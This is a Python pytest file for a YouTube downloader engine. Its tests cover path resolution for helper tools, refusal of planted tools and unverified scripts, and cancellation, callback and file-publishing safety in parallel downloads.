def test_explicit_path_resolution_returns_absolute_authorized_tools(
        monkeypatch, tmp_path):
    from Final import optional_tools
    from Final import yt_final as Y

    tool_dir = tmp_path / 'explicit-tools'
    tool_dir.mkdir()
    suffix = '.exe' if Y._sys.platform.startswith('win') else ''
    node = tool_dir / f'node{suffix}'
    aria = tool_dir / f'aria2c{suffix}'
    turbo = tool_dir / f'N_m3u8DL-RE{suffix}'
    for path in (node, aria, turbo):
        path.write_bytes(b'explicit PATH fixture')
        # PATH discovery requires os.access(..., X_OK), which honours the real
        # mode bits on POSIX; the fixtures must be executable there or nothing
        # resolves. Harmless no-op on Windows.
        path.chmod(0o755)
    monkeypatch.setenv('PATH', str(tool_dir))
    monkeypatch.setattr(optional_tools, 'managed_runtime_path', lambda _name: None)

    def successful_probe(argv, **_kwargs):
        assert Path(argv[0]).is_absolute()
        return type('Result', (), {
            'returncode': 0,
            'stdout': 'N_m3u8DL-RE 1.0',
            'stderr': '',
        })()

    monkeypatch.setattr(Y.subprocess, 'run', successful_probe)

    assert os.path.normcase(Y._js_runtime_execution_path('node')) == (
        os.path.normcase(str(node.resolve()))
    )
    downloader = Y.YouTubeDownloader.__new__(Y.YouTubeDownloader)
    assert os.path.normcase(downloader._find_aria2c()) == (
        os.path.normcase(str(aria.resolve()))
    )
    assert os.path.normcase(downloader._find_n_m3u8dl()) == (
        os.path.normcase(str(turbo.resolve()))
    )


@pytest.mark.parametrize('mode', ['auto', 'lazy'])
def test_default_pot_modes_never_discover_or_wire_unverified_script(
        monkeypatch, tmp_path, mode):
    import urllib.request
    from Final import optional_tools
    from Final import yt_final as Y

    poison = tmp_path / 'bgutil' / 'server' / 'build' / 'generate_once.js'
    poison.parent.mkdir(parents=True)
    poison.write_text('// poison', encoding='utf-8')
    monkeypatch.setattr(
        optional_tools,
        'find_bgutil_script_path',
        lambda: (_ for _ in ()).throw(
            BaseException('default mode discovered unverified script')
        ),
    )
    monkeypatch.setattr(
        urllib.request,
        'urlopen',
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            OSError('HTTP provider is not running')
        ),
    )
    downloader = Y.YouTubeDownloader.__new__(Y.YouTubeDownloader)
    downloader.pot_mode = mode
    downloader.pot_base_url = None
    downloader._pot_status_cache = None
    ea = {'youtube': {}}

    downloader._apply_pot_mode(ea)

    disabled_script = ea['youtubepot-bgutilscript']['script_path'][0]
    assert Path(disabled_script).is_absolute()
    assert not Path(disabled_script).exists()
    assert 'mweb' not in ea['youtube']['player_client']


def test_default_opts_disable_implicit_js_and_ffmpeg_discovery(
        monkeypatch, tmp_path):
    from Final import yt_final as Y

    suffix = '.exe' if Y._sys.platform.startswith('win') else ''
    for name in ('deno', 'node', 'ffmpeg'):
        (tmp_path / f'{name}{suffix}').write_bytes(b'poisoned cwd tool')
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('PATH', '')
    detector = type('Detector', (), {'ffmpeg_path': 'ffmpeg'})()
    downloader = Y.YouTubeDownloader(detector, out_dir=tmp_path, pot_mode='auto')
    downloader._pot_provider_status = lambda: (None, 'offline')
    downloader._detect_js_runtimes = lambda: {}
    downloader.resolve_engine = lambda _spec=None: (
        'builtin',
        'built-in only',
        None,
        None,
    )

    opts = downloader.get_optimized_ydl_opts()

    assert opts['js_runtimes'] == {}
    assert Path(opts['ffmpeg_location']).is_absolute()
    assert not Path(opts['ffmpeg_location']).exists()
    assert Path(opts['ffmpeg_location']).parent != tmp_path


def test_explicit_script_mode_binds_each_provider_runtime_to_absolute_path(
        monkeypatch, tmp_path):
    from Final import yt_final as Y

    trusted_node = tmp_path / 'trusted' / 'node.exe'
    trusted_node.parent.mkdir()
    trusted_node.write_bytes(b'trusted node fixture')
    trusted_ffmpeg = tmp_path / 'trusted' / 'ffmpeg.exe'
    trusted_ffmpeg.write_bytes(b'trusted ffmpeg fixture')
    detector = type('Detector', (), {
        'ffmpeg_path': str(trusted_ffmpeg),
    })()
    downloader = Y.YouTubeDownloader(
        detector,
        out_dir=tmp_path,
        pot_mode='script',
    )
    downloader._detect_js_runtimes = lambda: {
        'node': {'path': str(trusted_node)},
    }
    downloader.resolve_engine = lambda _spec=None: (
        'builtin',
        'built-in only',
        None,
        None,
    )

    opts = downloader.get_optimized_ydl_opts()

    script_config = opts['extractor_args']['youtubepot-bgutilscript']
    assert Path(script_config['server_home'][0]).is_absolute()
    assert opts['js_runtimes']['node']['path'] == str(trusted_node)
    deno_path = Path(opts['js_runtimes']['deno']['path'])
    assert deno_path.is_absolute()
    assert not deno_path.exists()
    assert Path(opts['ffmpeg_location']) == trusted_ffmpeg.resolve()


def test_extract_only_is_sink_free_and_returns_info():
    """extract_only returns the extracted info and never installs a progress sink (it runs on a
    background prefetch thread); on any failure it returns None so the caller re-extracts inline."""
    import sys as _sys
    class _FakeYDL:
        def __init__(self, *a, **k): pass
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def extract_info(self, url, download=False): return {'id': 'X', 'url': url}
    saved = _sys.modules.get('yt_dlp')
    _sys.modules['yt_dlp'] = type('m', (), {'YoutubeDL': _FakeYDL})()
    try:
        dl = YouTubeDownloader(CapabilityDetector(), out_dir='.')
        dl.progress_sink = 'SENTINEL'
        info = dl.extract_only('https://www.youtube.com/watch?v=x')
        assert info == {'id': 'X', 'url': 'https://www.youtube.com/watch?v=x'}
        assert dl.progress_sink == 'SENTINEL', 'extract_only must not touch progress_sink'
        # failure path -> None (caller extracts inline)
        _sys.modules['yt_dlp'] = type('m', (), {'YoutubeDL': type('B', (_FakeYDL,), {
            'extract_info': lambda self, *a, **k: (_ for _ in ()).throw(RuntimeError('boom'))})})()
        assert dl.extract_only('https://www.youtube.com/watch?v=x') is None
    finally:
        if saved is not None:
            _sys.modules['yt_dlp'] = saved
        else:
            _sys.modules.pop('yt_dlp', None)
    print('test_extract_only_is_sink_free_and_returns_info passed')


def test_extract_only_propagates_cancel():
    """extract_only must RE-RAISE a cooperative cancel, never swallow it as 'no prefetch' — consistent
    with every other layer's cancel-escape, and it keeps the batch pipeline's cancel handler live."""
    import sys as _sys
    from Final.yt_final import DownloadCancelled
    class _CancelYDL:
        def __init__(self, *a, **k): pass
        def __enter__(self): return self
        def __exit__(self, *a): return False
        def extract_info(self, *a, **k): raise DownloadCancelled('YT_FINAL_CANCEL')
    saved = _sys.modules.get('yt_dlp')
    _sys.modules['yt_dlp'] = type('m', (), {'YoutubeDL': _CancelYDL})()
    try:
        dl = YouTubeDownloader(CapabilityDetector(), out_dir='.')
        raised = False
        try:
            dl.extract_only('https://www.youtube.com/watch?v=x')
        except DownloadCancelled:
            raised = True
        assert raised, 'extract_only must re-raise DownloadCancelled, not return None'
    finally:
        if saved is not None:
            _sys.modules['yt_dlp'] = saved
        else:
            _sys.modules.pop('yt_dlp', None)
    print('test_extract_only_propagates_cancel passed')


def test_run_body_prefetches_and_passes_info():
    """The batch pipeline extracts url[i+1] while url[i] downloads, and hands each prefetched info to
    the next download as preextracted_info. url[0] has no prefetch (nothing before it) -> None."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine(output_dir='.')
    dl = eng.downloader
    urls = ['https://youtu.be/a', 'https://youtu.be/b', 'https://youtu.be/c']
    extracted, downloaded_with = [], []
    dl._warm_probe_caches = lambda spec=None: None
    dl.extract_only = lambda url, *a, **k: (extracted.append(url) or {'id': url})
    def _fake_download(url, *a, preextracted_info=None, **k):
        downloaded_with.append((url, preextracted_info))
        return []
    dl.download = _fake_download
    eng._run_body(JobSpec(urls=urls, quality='1080p', encode_mode='none'), urls, dl)
    assert downloaded_with[0] == ('https://youtu.be/a', None)                       # first: no prefetch
    assert downloaded_with[1] == ('https://youtu.be/b', {'id': 'https://youtu.be/b'})
    assert downloaded_with[2] == ('https://youtu.be/c', {'id': 'https://youtu.be/c'})
    assert extracted == ['https://youtu.be/b', 'https://youtu.be/c']                # prefetched 2nd + 3rd
    print('test_run_body_prefetches_and_passes_info passed')


def test_run_body_dedupes_aliases_before_prefetch_scheduler():
    """Canonical aliases must collapse before _run_body decides to create/prefill its executor."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    eng = FinalYouTubeGPUEngine(output_dir='.')
    dl = eng.downloader
    video_id = 'dQw4w9WgXcQ'
    aliases = [
        f'https://youtu.be/{video_id}',
        f'https://www.youtube.com/watch?v={video_id}',
    ]
    extracted, downloaded = [], []
    dl._warm_probe_caches = lambda spec=None: None
    dl.extract_only = lambda url, *a, **k: extracted.append(url)
    dl.download = lambda url, *a, **k: (downloaded.append(url) or [])

    eng._run_body(
        JobSpec(urls=aliases, quality='1080p', encode_mode='none'),
        (url for url in aliases),
        dl,
    )

    assert downloaded == [aliases[0]]
    assert extracted == []


@pytest.mark.parametrize(
    ('parallel', 'speed_priority', 'expected_path'),
    [
        (False, False, 'download'),
        (False, True, 'priority'),
        (True, False, 'parallel'),
    ],
)
def test_run_body_finalizes_inside_download_identity_callback(
        tmp_path, parallel, speed_priority, expected_path):
    """Every engine scheduling path must process/final-rename before the downloader releases its lock."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    eng = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    dl = eng.downloader
    raw = tmp_path / 'raw.mp4'
    final = tmp_path / 'final.mp4'
    raw.write_bytes(b'raw')
    state = {'inside': False, 'path': None}

    def protected_result(path, callback):
        state['path'] = path
        if callback is None:
            return [raw]
        state['inside'] = True
        try:
            return callback([raw])
        finally:
            state['inside'] = False

    dl.download = lambda *a, _post_download=None, **k: protected_result(
        'download', _post_download)
    dl._download_with_priority = lambda *a, _post_download=None, **k: protected_result(
        'priority', _post_download)
    dl.download_parallel = lambda *a, _post_download=None, **k: protected_result(
        'parallel', _post_download)

    def finalize(_src, _spec):
        assert state['inside'], 'finalize ran after the output identity lock callback returned'
        final.write_bytes(b'final')
        return final

    eng._finalize = finalize
    urls = (
        ['https://youtu.be/dQw4w9WgXcQ', 'https://youtu.be/aB3dE5gH7_k']
        if parallel
        else ['https://youtu.be/dQw4w9WgXcQ']
    )
    result = eng._run_body(
        JobSpec(
            urls=urls,
            encode_mode='copy',
            parallel=parallel,
            speed_priority=speed_priority,
        ),
        urls,
        dl,
    )

    assert result == [final]
    assert state['path'] == expected_path


def test_run_body_fails_closed_when_downloader_ignores_post_download(tmp_path):
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    engine = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    raw = tmp_path / "ignored-callback.mp4"
    raw.write_bytes(b"raw")
    finalized = []

    class IgnoringDownloader:
        def download(self, *args, **kwargs):
            return [raw]

    engine._finalize = lambda src, spec: finalized.append(src) or src
    spec = JobSpec(
        urls=["https://youtu.be/dQw4w9WgXcQ"],
        encode_mode="copy",
    )

    with pytest.raises(RuntimeError, match="post-download callback"):
        engine._run_body(spec, spec.urls, IgnoringDownloader())

    assert finalized == []


def test_run_body_fails_closed_before_a_second_callback_finalizes_again(tmp_path):
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    engine = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    raw = tmp_path / "double-callback.mp4"
    raw.write_bytes(b"raw")
    finalized = []

    class DoubleCallingDownloader:
        def download(self, *args, _post_download=None, **kwargs):
            first = _post_download([raw])
            _post_download([raw])
            return first

    engine._finalize = lambda src, spec: finalized.append(src) or src
    spec = JobSpec(
        urls=["https://youtu.be/dQw4w9WgXcQ"],
        encode_mode="copy",
    )

    with pytest.raises(RuntimeError, match="exactly once"):
        engine._run_body(spec, spec.urls, DoubleCallingDownloader())

    assert finalized == [raw]


def test_run_body_rejects_callback_deferred_until_after_download_returns(tmp_path):
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    engine = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    raw = tmp_path / "deferred-callback.mp4"
    raw.write_bytes(b"raw")
    saved = {}
    finalized = []

    class DeferringDownloader:
        def download(self, *args, _post_download=None, **kwargs):
            saved["callback"] = _post_download
            return [raw]

    engine._finalize = lambda src, spec: finalized.append(src) or src
    spec = JobSpec(
        urls=["https://youtu.be/dQw4w9WgXcQ"],
        encode_mode="copy",
    )

    with pytest.raises(RuntimeError, match="post-download callback"):
        engine._run_body(spec, spec.urls, DeferringDownloader())
    with pytest.raises(RuntimeError, match="synchronously"):
        saved["callback"]([raw])

    assert finalized == []


def test_parallel_callback_failure_blocks_later_completion_action(tmp_path):
    from Final.yt_final import (
        FinalYouTubeGPUEngine,
        VerificationError,
    )

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    first = tmp_path / "first.mp4"
    second = tmp_path / "second.mp4"
    first.write_bytes(b"first")
    second.write_bytes(b"second")
    first_failed = threading.Event()
    second_ready = threading.Event()
    actions = []

    def fake_download(url, *args, _post_download=None, **kwargs):
        if url.endswith("first"):
            assert second_ready.wait(3)
            try:
                return _post_download([first])
            finally:
                first_failed.set()
        second_ready.set()
        assert first_failed.wait(3)
        return _post_download([second])

    def completion(paths):
        path = Path(paths[0])
        actions.append(path.name)
        if path == first:
            raise VerificationError("terminal finalize failure")
        return paths

    downloader.download = fake_download

    with pytest.raises(VerificationError, match="terminal finalize failure"):
        downloader.download_parallel(
            ["https://youtu.be/first", "https://youtu.be/second"],
            max_workers=2,
            _post_download=completion,
        )

    assert actions == ["first.mp4"]


def test_parallel_raw_cancel_closes_gate_before_second_callback(
        tmp_path, monkeypatch):
    import Final.yt_final as yt_final_module
    from Final.yt_final import (
        DownloadCancelled,
        FinalYouTubeGPUEngine,
    )

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    first_raised = threading.Event()
    second_ready = threading.Event()
    real_event = threading.Event
    created_events = []
    actions = []

    def capture_event():
        event = real_event()
        created_events.append(event)
        return event

    monkeypatch.setattr(yt_final_module.threading, "Event", capture_event)

    def fake_download(url, *args, _post_download=None, **kwargs):
        if url.endswith("cancel"):
            assert second_ready.wait(3)
            first_raised.set()
            raise DownloadCancelled("YT_FINAL_CANCEL")
        second_ready.set()
        assert first_raised.wait(3)
        assert created_events, "parallel callback gate was not constructed"
        created_events[0].wait(0.5)
        return _post_download([tmp_path / "late.mp4"])

    downloader.download = fake_download

    with pytest.raises(DownloadCancelled):
        downloader.download_parallel(
            ["https://youtu.be/cancel", "https://youtu.be/late"],
            max_workers=2,
            _post_download=lambda paths: actions.append(paths) or paths,
        )

    assert actions == []


def test_parallel_cancel_closure_beats_a_stale_callback_gate_read(
        tmp_path, monkeypatch):
    import inspect
    import Final.yt_final as yt_final_module
    from Final.yt_final import (
        DownloadCancelled,
        FinalYouTubeGPUEngine,
    )

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    real_event = threading.Event
    real_executor = yt_final_module.ThreadPoolExecutor
    peer_ready = real_event()
    stale_read = real_event()
    cancel_future_published = real_event()
    gate_instances = []
    cancel_futures = []
    actions = []
    cancellation = DownloadCancelled("YT_FINAL_CANCEL: stale callback admission")

    class StaleReadEvent:
        """Return a cached open value only after cancellation has closed the event."""

        def __init__(self):
            self._event = real_event()

        def is_set(self):
            observed = self._event.is_set()
            stale_read.set()
            assert self._event.wait(3), "terminal cancellation never closed the gate"
            return observed

        def set(self):
            self._event.set()

    def instrument_parallel_gate_only():
        caller = inspect.currentframe().f_back
        if (
                caller.f_code.co_name == "download_parallel"
                and Path(caller.f_code.co_filename) == Path(yt_final_module.__file__)
        ):
            event = StaleReadEvent()
            gate_instances.append(event)
            return event
        return real_event()

    class ObservedExecutor(real_executor):
        def submit(self, fn, *args, **kwargs):
            future = super().submit(fn, *args, **kwargs)
            if args and str(args[0]).endswith("cancel"):
                cancel_futures.append(future)
                cancel_future_published.set()
            return future

    monkeypatch.setattr(
        yt_final_module.threading,
        "Event",
        instrument_parallel_gate_only,
    )
    monkeypatch.setattr(yt_final_module, "ThreadPoolExecutor", ObservedExecutor)

    def fake_download(url, *args, _post_download=None, **kwargs):
        if url.endswith("cancel"):
            assert peer_ready.wait(3)
            if gate_instances:
                assert stale_read.wait(3), "peer never cached the open gate"
            raise cancellation

        peer_ready.set()
        if not gate_instances:
            # The fixed state machine has no independently readable Event.
            # Wait for the real cancelling future to finish, proving terminal
            # closure won before this callback attempts admission.
            assert cancel_future_published.wait(3)
            with pytest.raises(DownloadCancelled) as peer_cancel:
                cancel_futures[0].result(timeout=3)
            assert peer_cancel.value is cancellation
        return _post_download([tmp_path / "late.mp4"])

    downloader.download = fake_download

    with pytest.raises(DownloadCancelled) as raised:
        downloader.download_parallel(
            ["https://youtu.be/cancel", "https://youtu.be/late"],
            max_workers=2,
            _post_download=lambda paths: actions.append(paths) or paths,
        )

    assert raised.value is cancellation
    assert actions == []


def test_parallel_cancelled_single_worker_never_starts_queued_peer(
        tmp_path, monkeypatch):
    from concurrent.futures import wait
    import Final.yt_final as yt_final_module
    from Final.yt_final import (
        DownloadCancelled,
        FinalYouTubeGPUEngine,
    )

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    real_as_completed = yt_final_module.as_completed
    calls = []
    actions = []
    cancellation = DownloadCancelled("YT_FINAL_CANCEL: queued peer handoff")

    def collect_after_worker_handoff(futures):
        futures = tuple(futures)
        _done, pending = wait(futures, timeout=3)
        assert not pending, "worker did not finish the queued handoff"
        return real_as_completed(futures)

    monkeypatch.setattr(
        yt_final_module,
        "as_completed",
        collect_after_worker_handoff,
    )

    def fake_download(url, *args, _post_download=None, **kwargs):
        calls.append(url)
        if url.endswith("cancel"):
            raise cancellation
        return _post_download([tmp_path / "queued.mp4"])

    downloader.download = fake_download

    with pytest.raises(DownloadCancelled) as raised:
        downloader.download_parallel(
            ["https://youtu.be/cancel", "https://youtu.be/queued"],
            max_workers=1,
            _post_download=lambda paths: actions.append(paths) or paths,
        )

    assert raised.value is cancellation
    assert raised.value.args == ("YT_FINAL_CANCEL: queued peer handoff",)
    assert calls == ["https://youtu.be/cancel"]
    assert actions == []


def test_parallel_raw_baseexception_closes_batch_and_cancels_every_peer(
        tmp_path, monkeypatch):
    from concurrent.futures import Future, wait
    import Final.yt_final as yt_final_module
    from Final.yt_final import FinalYouTubeGPUEngine

    class FatalWorkerSignal(BaseException):
        pass

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    real_executor = yt_final_module.ThreadPoolExecutor
    real_cancel = Future.cancel
    collection_started = threading.Event()
    peer_started = threading.Event()
    fatal_future_published = threading.Event()
    futures_by_url = {}
    cancel_calls = []
    download_calls = []
    actions = []
    fatal = FatalWorkerSignal("fatal worker signal", 73)
    urls = [
        "https://youtu.be/fatal",
        "https://youtu.be/peer",
        "https://youtu.be/queued",
    ]

    def tracked_cancel(future):
        cancel_calls.append(future)
        return real_cancel(future)

    class ObservedExecutor(real_executor):
        def submit(self, fn, *args, **kwargs):
            future = super().submit(fn, *args, **kwargs)
            futures_by_url[args[0]] = future
            if args[0].endswith("fatal"):
                fatal_future_published.set()
            return future

    def yield_fatal_first(futures):
        futures = tuple(futures)
        collection_started.set()
        assert fatal_future_published.wait(3), "fatal future was not published"
        fatal_future = futures_by_url[urls[0]]
        _done, pending = wait([fatal_future], timeout=3)
        assert not pending, "fatal worker did not finish"
        return iter([fatal_future, *[future for future in futures if future is not fatal_future]])

    monkeypatch.setattr(Future, "cancel", tracked_cancel)
    monkeypatch.setattr(yt_final_module, "ThreadPoolExecutor", ObservedExecutor)
    monkeypatch.setattr(yt_final_module, "as_completed", yield_fatal_first)

    def fake_download(url, *args, _post_download=None, **kwargs):
        download_calls.append(url)
        if url.endswith("fatal"):
            assert peer_started.wait(3), "peer worker did not start"
            assert collection_started.wait(3), "collector did not begin"
            raise fatal

        if url.endswith("peer"):
            peer_started.set()
            assert fatal_future_published.wait(3), "fatal future was not published"
            fatal_future = futures_by_url[urls[0]]
            _done, pending = wait([fatal_future], timeout=3)
            assert not pending, "fatal worker did not close before peer callback"
        return _post_download([tmp_path / f"{url.rsplit('/', 1)[-1]}.mp4"])

    downloader.download = fake_download

    with pytest.raises(FatalWorkerSignal) as raised:
        downloader.download_parallel(
            urls,
            max_workers=2,
            _post_download=lambda paths: actions.append(paths) or paths,
        )

    assert raised.value is fatal
    assert type(raised.value) is FatalWorkerSignal
    assert raised.value.args == ("fatal worker signal", 73)
    assert actions == []
    fatal_future = futures_by_url[urls[0]]
    non_current = {futures_by_url[url] for url in urls[1:]}
    assert fatal_future not in cancel_calls
    assert set(cancel_calls) == non_current
    assert urls[2] not in download_calls


@pytest.mark.parametrize(
    ("first_kind", "second_kind"),
    [
        ("callback_exception", "download_cancelled"),
        ("download_cancelled", "raw_baseexception"),
        ("raw_baseexception", "callback_exception"),
    ],
)
def test_parallel_competing_terminals_always_surface_first_closed_object(
        tmp_path, monkeypatch, first_kind, second_kind):
    from concurrent.futures import wait
    import Final.yt_final as yt_final_module
    from Final.yt_final import (
        DownloadCancelled,
        FinalYouTubeGPUEngine,
        VerificationError,
    )

    class FatalWorkerSignal(BaseException):
        pass

    def make_terminal(kind, position):
        if kind == "callback_exception":
            return VerificationError(f"{position} callback exception", position)
        if kind == "download_cancelled":
            return DownloadCancelled(f"YT_FINAL_CANCEL: {position}", position)
        return FatalWorkerSignal(f"{position} raw baseexception", position)

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    real_executor = yt_final_module.ThreadPoolExecutor
    futures_by_url = {}
    first_future_published = threading.Event()
    second_started = threading.Event()
    callback_entries = []
    first = make_terminal(first_kind, "first")
    second = make_terminal(second_kind, "second")
    urls = ["https://youtu.be/first", "https://youtu.be/second"]

    class ObservedExecutor(real_executor):
        def submit(self, fn, *args, **kwargs):
            future = super().submit(fn, *args, **kwargs)
            futures_by_url[args[0]] = future
            if args[0].endswith("first"):
                first_future_published.set()
            return future

    def yield_second_first(futures):
        futures = tuple(futures)
        _done, pending = wait(futures, timeout=3)
        assert not pending, "competing terminal workers did not finish"
        return iter([futures_by_url[urls[1]], futures_by_url[urls[0]]])

    monkeypatch.setattr(yt_final_module, "ThreadPoolExecutor", ObservedExecutor)
    monkeypatch.setattr(yt_final_module, "as_completed", yield_second_first)

    def raise_terminal(kind, terminal, url, post_download):
        if kind == "callback_exception":
            return post_download([tmp_path / f"{url.rsplit('/', 1)[-1]}.mp4"])
        raise terminal

    def fake_download(url, *args, _post_download=None, **kwargs):
        if url.endswith("first"):
            assert second_started.wait(3), "second worker did not gain admission"
            return raise_terminal(first_kind, first, url, _post_download)

        second_started.set()
        assert first_future_published.wait(3), "first future was not published"
        first_future = futures_by_url[urls[0]]
        _done, pending = wait([first_future], timeout=3)
        assert not pending, "first terminal did not close before second terminal"
        return raise_terminal(second_kind, second, url, _post_download)

    def completion(paths):
        label = Path(paths[0]).stem
        callback_entries.append(label)
        raise first if label == "first" else second

    downloader.download = fake_download

    with pytest.raises(BaseException) as raised:
        downloader.download_parallel(
            urls,
            max_workers=2,
            _post_download=completion,
        )

    assert raised.value is first
    assert type(raised.value) is type(first)
    assert raised.value.args == first.args
    assert callback_entries == (["first"] if first_kind == "callback_exception" else [])


def test_parallel_download_fails_closed_if_item_ignores_callback(tmp_path):
    from Final.yt_final import FinalYouTubeGPUEngine

    downloader = FinalYouTubeGPUEngine(output_dir=str(tmp_path)).downloader
    downloader._warm_probe_caches = lambda spec=None: None
    raw = tmp_path / "raw.mp4"
    raw.write_bytes(b"raw")
    actions = []
    downloader.download = lambda *args, **kwargs: [raw]

    with pytest.raises(RuntimeError, match="post-download callback"):
        downloader.download_parallel(
            ["https://youtu.be/dQw4w9WgXcQ"],
            max_workers=1,
            _post_download=lambda paths: actions.append(paths) or paths,
        )

    assert actions == []


def test_parallel_finalizers_keep_fallback_profile_attribution_per_call(tmp_path):
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec

    engine = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    engine._actual_profiles = {}
    first = tmp_path / "first.webm"
    second = tmp_path / "second.webm"
    first.write_bytes(b"first")
    second.write_bytes(b"second")
    engine.downloader.last_info = {str(first): {}, str(second): {}}
    engine._verify_output = lambda *args, **kwargs: (True, None)
    first_selected = threading.Event()
    second_selected = threading.Event()

    def encode_with_interleaving(src, dst, profile, **kwargs):
        src = Path(src)
        selected = "profile-first" if src.stem.startswith("first") else "profile-second"
        if selected == "profile-first":
            engine.processor._last_fallback_profile = selected
            first_selected.set()
            assert second_selected.wait(3)
        else:
            assert first_selected.wait(3)
            engine.processor._last_fallback_profile = selected
            second_selected.set()
        Path(dst).write_bytes(src.read_bytes())
        return selected

    engine.processor.encode_with_fallback = encode_with_interleaving
    engine.processor.output_ext = lambda profile: ".mp4"
    spec = JobSpec(
        urls=["https://youtu.be/dQw4w9WgXcQ"],
        encode_mode="reencode",
        profile="auto_h264",
        chapters=False,
        embed_metadata=False,
        preserve_hdr=False,
        color_tag="off",
    )

    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [
            executor.submit(engine._finalize, source, spec)
            for source in (first, second)
        ]
        results = [future.result(timeout=5) for future in futures]

    assert engine._actual_profiles[str(results[0])] == "profile-first"
    assert engine._actual_profiles[str(results[1])] == "profile-second"


def test_folder_artwork_publication_has_one_atomic_first_writer(
        tmp_path, monkeypatch):
    import shutil
    from Final.yt_final import FinalYouTubeGPUEngine

    engine = FinalYouTubeGPUEngine(output_dir=str(tmp_path))
    sources = []
    for stem, payload in (("first", b"first-jpeg"), ("second", b"second-jpeg")):
        media = tmp_path / f"{stem}.mp4"
        thumb = tmp_path / f"{stem}.jpg"
        media.write_bytes(b"media")
        thumb.write_bytes(payload)
        sources.append(media)

    real_copyfile = shutil.copyfile
    both_checked_missing = threading.Barrier(2)

    def coordinated_copyfile(src, dst, *args, **kwargs):
        name = Path(dst).name
        if name.startswith(".folder.jpg.") and name.endswith(".tmp"):
            both_checked_missing.wait(3)
        return real_copyfile(src, dst, *args, **kwargs)

    monkeypatch.setattr(shutil, "copyfile", coordinated_copyfile)
    with ThreadPoolExecutor(max_workers=2) as executor:
        futures = [
            executor.submit(engine._write_artwork, media, media, {})
            for media in sources
        ]
        written = [future.result(timeout=5) for future in futures]

    folder_reports = sum(
        path.name == "folder.jpg"
        for batch in written
        for path in batch
    )
    assert folder_reports == 1
    assert (tmp_path / "folder.jpg").read_bytes() in {
        b"first-jpeg",
        b"second-jpeg",
    }
    assert not list(tmp_path.glob(".folder.jpg.*.tmp"))


def test_folder_artwork_no_link_fallback_has_one_cross_process_winner(tmp_path):
    import multiprocessing
    import queue

    context = multiprocessing.get_context("spawn")
    destination = tmp_path / "folder.jpg"
    sources = []
    payloads = {}
    for name, payload in (("one.jpg", b"first-writer"), ("two.jpg", b"second-writer")):
        source = tmp_path / name
        source.write_bytes(payload)
        sources.append(source)
        payloads[name] = payload

    link_barrier = context.Barrier(2)
    stale_read_barrier = context.Barrier(2)
    result_queue = context.Queue()
    processes = [
        context.Process(
            target=_forced_no_link_artwork_worker,
            args=(
                str(source),
                str(destination),
                link_barrier,
                stale_read_barrier,
                result_queue,
            ),
        )
        for source in sources
    ]

    for process in processes:
        process.start()
    for process in processes:
        process.join(10)
    for process in processes:
        if process.is_alive():
            process.terminate()
            process.join(3)
            pytest.fail("artwork publisher process hung")
        assert process.exitcode == 0

    results = []
    for _ in processes:
        try:
            results.append(result_queue.get(timeout=3))
        except queue.Empty:
            pytest.fail("artwork publisher process returned no result")

    assert all(error is None for _name, _won, error in results), results
    winners = [(name, won) for name, won, _error in results if won]
    assert len(winners) == 1, results
    assert destination.read_bytes() == payloads[winners[0][0]]
    assert len(list(tmp_path.glob(".folder.jpg.*.publish.lock"))) == 1


def test_degradation_reason_fires_only_on_storyboards_only():
    """Fail-fast on a TOTALLY degraded extraction (every client returned only storyboards) but NEVER on
    live/HLS or audio-only — regression guard against the itag-set check that hard-failed live streams."""
    R = YouTubeDownloader._degradation_reason
    yt = lambda fmts: {'extractor_key': 'Youtube', 'formats': fmts}
    assert R(yt([{'format_id': 'sb0'}, {'format_id': 'sb1'}]))                          # all storyboards -> fires
    assert R(yt([{'format_id': '137'}, {'format_id': '140'}])) is None                  # real DASH -> ok
    assert R(yt([{'format_id': '96'}, {'format_id': '95'}, {'format_id': '91'}])) is None  # LIVE HLS -> must NOT fire
    assert R(yt([{'format_id': '251'}])) is None                                        # audio-only present -> ok
    assert R(yt([{'format_id': '248'}, {'format_id': '251'}])) is None                  # VP9+opus, no avc1 -> ok
    assert R(yt([])) is None                                                            # playlist/no formats -> ok
    assert R({'extractor_key': 'Generic', 'formats': [{'format_id': 'sb0'}]}) is None   # non-YouTube -> ignored
    assert R(None) is None
    print('test_degradation_reason_fires_only_on_storyboards_only passed')


def test_throttle_hint_fires_only_on_shaping_signature():
    """Post-download throttle diagnostic fires on the burst-then-clamp (token-bucket) signature — the
    flow proved it can go fast (peak >= 8, >=3 hi samples) but sustained far below it (< 3.5 and a
    small fraction of peak) — and NEVER on healthy 0->26 oscillation, slow links, or small downloads."""
    H = YouTubeDownloader._throttle_hint
    M = 1024 * 1024
    assert H(1.5 * M, 26 * M, 8, 200 * M, 120)                  # burst 26, clamp 1.5 -> FIRES
    assert H(15 * M, 26 * M, 80, 200 * M, 120) is None          # healthy oscillation (mean 15) -> no fire
    assert H(1.8 * M, 2 * M, 0, 200 * M, 120) is None           # slow link (never bursts) -> no fire
    assert H(1.5 * M, 9 * M, 1, 200 * M, 120) is None           # one cold-start outlier (hi<3) -> no fire
